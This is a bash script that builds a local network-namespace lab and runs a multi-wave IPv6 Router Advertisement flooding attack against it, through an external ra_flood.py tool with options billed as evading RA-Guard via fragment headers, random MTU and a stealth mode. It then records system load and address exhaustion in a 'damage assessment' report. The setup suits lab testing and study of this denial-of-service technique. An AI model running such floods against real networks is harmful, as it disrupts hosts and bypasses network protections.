#!/bin/bash

echo "⚠️  WARNING: HEAVY IPv6 RA FLOODING ATTACK"
echo "==========================================="
echo "🚨 DANGER: This script may crash your system!"
echo "🚨 DANGER: High CPU usage, memory consumption, network saturation"
echo "🚨 DANGER: May cause system instability or freeze"
echo ""
echo "This script launches an aggressive RA flooding attack that may:"
echo "- Consume all available system memory"
echo "- Max out CPU usage"
echo "- Saturate network interfaces"
echo "- Cause kernel panic or system freeze"
echo "- Require hard system reset"
echo ""

read -p "⚠️  Do you understand the risks and want to continue? (y/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "❌ Attack cancelled. Good choice for system safety."
    exit 1
fi

echo ""
echo "⏰ Starting in 10 seconds... Press Ctrl+C to abort!"
for i in {10..1}; do
    echo "   $i..."
    sleep 1
done

echo ""
echo "🔥 LAUNCHING HEAVY ATTACK - NO GOING BACK!"
echo "=========================================="

# Create results directory
mkdir -p results

# Cleanup function  
cleanup() {
    echo ""
    echo "🚨 EMERGENCY CLEANUP INITIATED"
    echo "=============================="
    
    # Kill all related processes aggressively
    pkill -9 -f "ra_flood.py" 2>/dev/null || true
    pkill -9 -f "tcpdump" 2>/dev/null || true
    pkill -9 -f "monitor" 2>/dev/null || true
    
    # Network cleanup
    ip netns del victim 2>/dev/null || true
    ip link del veth-attacker 2>/dev/null || true
    
    echo "🆘 If system becomes unresponsive, hard reset may be required!"
    echo "✅ Cleanup attempted."
}
trap cleanup EXIT

# Network setup
echo "🔧 Setting up network for heavy attack..."
ip netns add victim
ip link add veth-attacker type veth peer name veth-victim
ip link set veth-victim netns victim

ip addr add 2001:db8:cafe::1/64 dev veth-attacker
ip link set veth-attacker up

ip netns exec victim ip addr add 2001:db8:cafe::2/64 dev veth-victim
ip netns exec victim ip link set veth-victim up
ip netns exec victim ip link set lo up

# Enable IPv6 autoconfiguration with aggressive settings
ip netns exec victim sysctl -w net.ipv6.conf.all.accept_ra=1 >/dev/null
ip netns exec victim sysctl -w net.ipv6.conf.veth-victim.accept_ra=1 >/dev/null
ip netns exec victim sysctl -w net.ipv6.conf.all.autoconf=1 >/dev/null

# Try to increase system limits (may fail)
ip netns exec victim sysctl -w net.ipv6.conf.veth-victim.max_addresses=1000 2>/dev/null || true
ip netns exec victim sysctl -w net.core.netdev_max_backlog=5000 2>/dev/null || true

echo "✅ Network configured for maximum stress"

# Start aggressive monitoring
echo ""
echo "📊 Starting aggressive monitoring..."
(
    echo "timestamp,cpu_usage,memory_usage,network_packets,ipv6_addresses" > results/heavy_attack_monitoring.csv
    while true; do
        timestamp=$(date +%s.%3N)
        cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | sed 's/%us,//')
        memory_usage=$(free | grep Mem | awk '{printf "%.1f", $3/$2 * 100.0}')
        network_packets=$(cat /proc/net/dev | grep veth-attacker | awk '{print $2}' || echo "0")
        ipv6_addresses=$(ip netns exec victim ip -6 addr show dev veth-victim 2>/dev/null | grep "scope global" | wc -l || echo "0")
        
        echo "$timestamp,$cpu_usage,$memory_usage,$network_packets,$ipv6_addresses" >> results/heavy_attack_monitoring.csv
        sleep 0.05  # Very aggressive monitoring
    done
) &
MONITOR_PID=$!

# Start packet capture (may fill disk)
echo "📡 Starting packet capture (WARNING: May fill disk space)..."
tcpdump -i veth-attacker -w results/heavy_attack.pcap >/dev/null 2>&1 &
TCPDUMP_PID=$!

echo ""
echo "🚨 LAUNCHING EXTREME RA FLOODING ATTACK"
echo "========================================"
echo "Attack configuration:"
echo "- Packet count: 10,000 RA packets"
echo "- Thread count: 8 threads (maximum stress)"
echo "- Rate: Unlimited (maximum system capability)"
echo "- Fragment header: Enabled (bypass RA-Guard)"
echo "- Random MTU: Enabled (more packet processing)"
echo "- Stealth mode: Disabled (maximum speed)"
echo ""
echo "🆘 SYSTEM MAY BECOME UNRESPONSIVE DURING ATTACK!"

# Record pre-attack system state
echo "💾 Recording pre-attack system state..."
ps aux > results/pre_attack_processes.txt 2>/dev/null || true
free -h > results/pre_attack_memory.txt 2>/dev/null || true
uptime > results/pre_attack_uptime.txt 2>/dev/null || true

attack_start=$(date +%s)
echo ""
echo "⚡ ATTACK STARTING NOW - $(date)"
echo "================================="

# Launch multiple simultaneous attacks
echo "🔥 Launching Attack Wave 1: Standard flood..."
timeout 30 python3 src/ra_flood.py -i veth-attacker -c 2000 --threads 4 --fragment --random-mtu > results/attack1_output.log 2>&1 &
ATTACK1_PID=$!

sleep 2

echo "🔥 Launching Attack Wave 2: Stealth flood..."
timeout 30 python3 src/ra_flood.py -i veth-attacker -c 2000 --threads 4 --stealth > results/attack2_output.log 2>&1 &
ATTACK2_PID=$!

sleep 2

echo "🔥 Launching Attack Wave 3: Maximum intensity..."
timeout 30 python3 src/ra_flood.py -i veth-attacker -c 6000 --threads 8 --fragment --random-mtu > results/attack3_output.log 2>&1 &
ATTACK3_PID=$!

echo ""
echo "🚨 ALL ATTACK WAVES LAUNCHED!"
echo "=============================="
echo "- Attack Wave 1: 2000 packets, 4 threads, fragments+MTU"
echo "- Attack Wave 2: 2000 packets, 4 threads, stealth mode"  
echo "- Attack Wave 3: 6000 packets, 8 threads, maximum stress"
echo "- Total: 10,000 packets across 16 threads"
echo ""
echo "⚠️  System monitoring:"

# Monitor system during attack
echo "📊 Real-time system monitoring (may lag due to high load):"
attack_samples=0
while kill -0 $ATTACK1_PID 2>/dev/null || kill -0 $ATTACK2_PID 2>/dev/null || kill -0 $ATTACK3_PID 2>/dev/null; do
    current_time=$(date +"%H:%M:%S")
    load_avg=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//')
    memory_used=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
    ipv6_count=$(ip netns exec victim ip -6 addr show dev veth-victim 2>/dev/null | grep "scope global" | wc -l || echo "ERR")
    
    echo "   [$current_time] Load: $load_avg, Memory: ${memory_used}%, IPv6: $ipv6_count addresses"
    
    # Check for system stress indicators
    if (( $(echo "$load_avg > 10" | bc -l) )); then
        echo "   🚨 HIGH SYSTEM LOAD DETECTED!"
    fi
    
    if [ "$memory_used" -gt 90 ]; then
        echo "   🚨 HIGH MEMORY USAGE DETECTED!"
    fi
    
    attack_samples=$((attack_samples + 1))
    sleep 1
done

# Wait for all attacks to complete
echo ""
echo "⏳ Waiting for attack completion..."
wait $ATTACK1_PID 2>/dev/null
wait $ATTACK2_PID 2>/dev/null  
wait $ATTACK3_PID 2>/dev/null

attack_end=$(date +%s)
attack_duration=$((attack_end - attack_start))

echo ""
echo "✅ All attack waves completed after $attack_duration seconds"

# Record post-attack system state
echo "💾 Recording post-attack system state..."
ps aux > results/post_attack_processes.txt 2>/dev/null || true
free -h > results/post_attack_memory.txt 2>/dev/null || true
uptime > results/post_attack_uptime.txt 2>/dev/null || true

# Analyze damage
echo ""
echo "🔍 ANALYZING SYSTEM IMPACT"
echo "=========================="

final_addresses=$(ip netns exec victim ip -6 addr show dev veth-victim 2>/dev/null | grep "scope global dynamic" | wc -l || echo "ERROR")
final_memory=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
final_load=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//')

echo "IPv6 addresses created: $final_addresses"
echo "Final memory usage: ${final_memory}%"
echo "Final system load: $final_load"
echo "Attack duration: $attack_duration seconds"
echo "Monitoring samples: $attack_samples"

# Stop monitoring and capture
kill $MONITOR_PID 2>/dev/null || true
kill $TCPDUMP_PID 2>/dev/null || true

# Generate damage report
echo ""
echo "📋 GENERATING DAMAGE ASSESSMENT REPORT"
echo "====================================="

cat > results/heavy_attack_report.txt << EOF
HEAVY IPv6 RA FLOODING ATTACK - DAMAGE ASSESSMENT
=================================================
Generated: $(date)
Attack Duration: $attack_duration seconds
Total Monitoring Samples: $attack_samples

ATTACK CONFIGURATION:
- Total packets: 10,000 RA packets
- Attack waves: 3 simultaneous waves
- Thread count: 16 total threads
- Additional features: Fragments, random MTU, stealth mode
- Attack intensity: MAXIMUM

SYSTEM IMPACT:
- IPv6 addresses created: $final_addresses
- Final memory usage: ${final_memory}%
- Final system load: $final_load
- System stability: $(if [ $attack_duration -lt 20 ]; then echo "POTENTIALLY COMPROMISED"; else echo "SURVIVED"; fi)

ATTACK EFFECTIVENESS:
EOF

if [ "$final_addresses" = "ERROR" ]; then
    echo "🚨 CRITICAL: System may be severely compromised" >> results/heavy_attack_report.txt
    echo "   - Unable to query victim system" >> results/heavy_attack_report.txt
    echo "   - Possible system crash or hang" >> results/heavy_attack_report.txt
elif [ "$final_addresses" -gt 10 ]; then
    echo "✅ SUCCESS: Heavy attack achieved significant impact" >> results/heavy_attack_report.txt
    echo "   - Created $final_addresses IPv6 addresses" >> results/heavy_attack_report.txt
    echo "   - Demonstrated system vulnerability under stress" >> results/heavy_attack_report.txt
else
    echo "⚠️  PARTIAL: Attack completed but limited impact" >> results/heavy_attack_report.txt
    echo "   - System showed resilience to heavy attack" >> results/heavy_attack_report.txt
fi

cat >> results/heavy_attack_report.txt << EOF

WARNING SIGNS OBSERVED:
- High system load during attack
- Increased memory consumption  
- Potential network interface saturation
- Multiple concurrent attack processes

EVIDENCE FILES:
- heavy_attack_monitoring.csv: System performance data
- heavy_attack.pcap: Network packet capture
- attack*_output.log: Attack tool outputs
- *_attack_*.txt: System state comparisons

RECOVERY RECOMMENDATIONS:
1. Monitor system stability after attack
2. Check for lingering high resource usage
3. Restart network services if needed
4. Reboot system if instability persists

⚠️  DISCLAIMER: This was an extreme stress test that may have
compromised system stability. Monitor system behavior closely.
EOF

echo "✅ Damage report generated: results/heavy_attack_report.txt"

echo ""
echo "🆘 HEAVY ATTACK COMPLETE - SYSTEM STATUS CHECK"
echo "=============================================="
echo "Attack result: $final_addresses IPv6 addresses created"
echo "System load: $final_load"
echo "Memory usage: ${final_memory}%"
echo ""

if [ "$final_addresses" = "ERROR" ] || [ "$final_memory" -gt 95 ]; then
    echo "🚨 CRITICAL: System may be severely stressed"
    echo "🚨 RECOMMENDATION: Monitor system closely, reboot if unstable"
else
    echo "✅ System appears to have survived the heavy attack"
    echo "ℹ️  Monitor system performance for any lingering effects"
fi

echo ""
echo "📁 GENERATED EVIDENCE FILES"
echo "==========================="
ls -lah results/

echo ""
echo "⚠️  IMPORTANT: MONITOR SYSTEM STABILITY"
echo "======================================"
echo "This heavy attack may have stressed your system significantly."
echo "Watch for signs of instability and reboot if necessary."
echo ""
echo "🎯 Heavy attack demonstration complete."
